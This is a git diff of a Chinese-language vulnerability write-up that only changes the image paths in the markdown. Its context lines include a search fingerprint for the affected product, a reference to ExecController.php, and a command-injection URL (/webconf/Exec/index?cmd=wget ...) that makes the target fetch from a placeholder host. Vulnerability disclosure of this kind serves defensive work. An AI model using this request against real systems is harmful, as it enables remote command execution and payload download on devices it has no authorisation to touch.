@@ -18,11 +18,11 @@ body="'/needUsbkey.php?username='"
 
 登陆页面
 
-![image-20230828162656143](images/image-20230828162656143.png)
+![image-20230828162656143](../.gitbook/assets/image-20230828162656143.png)
 
 漏洞存在于文件 ExecController.php 文件中
 
-![image-20230828162917436](images/image-20230828162917436.png)
+![image-20230828162917436](../.gitbook/assets/image-20230828162917436.png)
 
 ```
 <?php
@@ -58,6 +58,6 @@ class ExecController extends Cavy_Controller_Action {
 /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
 ```
 
-![image-20230828162933312](images/image-20230828162933312.png)
+![image-20230828162933312](../.gitbook/assets/image-20230828162933312.png)
 
-![image-20230828162948491](images/image-20230828162948491.png)
+![image-20230828162948491](../.gitbook/assets/image-20230828162948491.png)
